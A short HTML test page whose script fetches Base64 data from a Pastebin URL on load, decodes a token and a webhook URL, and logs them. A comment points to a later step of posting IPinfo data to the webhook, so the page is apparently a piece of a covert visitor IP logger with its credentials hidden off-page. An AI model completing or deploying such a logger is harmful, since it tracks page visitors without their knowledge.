<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Test Script</title>
</head>
<body>
    <script>
        const pastebinUrl = 'https://pastebin.com/raw/quyru4jf';

        async function testFetchAndDecode() {
            try {
                // Step 1: Fetch the encoded data from Pastebin
                const pastebinResponse = await fetch(pastebinUrl);
                const encodedData = await pastebinResponse.text();

                // Step 2: Decode the Base64 data
                const decodedData = atob(encodedData).split(',');

                // Step 3: Extract and log token and webhook URL for verification
                const token = decodedData[0];
                const webhookUrl = decodedData[1];
                console.log("Token:", token);        // Verify if this logs correctly
                console.log("Webhook URL:", webhookUrl); // Verify if this logs correctly

                // Optional: Proceed with IPinfo and webhook posting after verifying the values
            } catch (error) {
                console.log("Error in fetching or decoding:", error);
            }
        }

        // Execute the function
        testFetchAndDecode();
    </script>
</body>
</html>
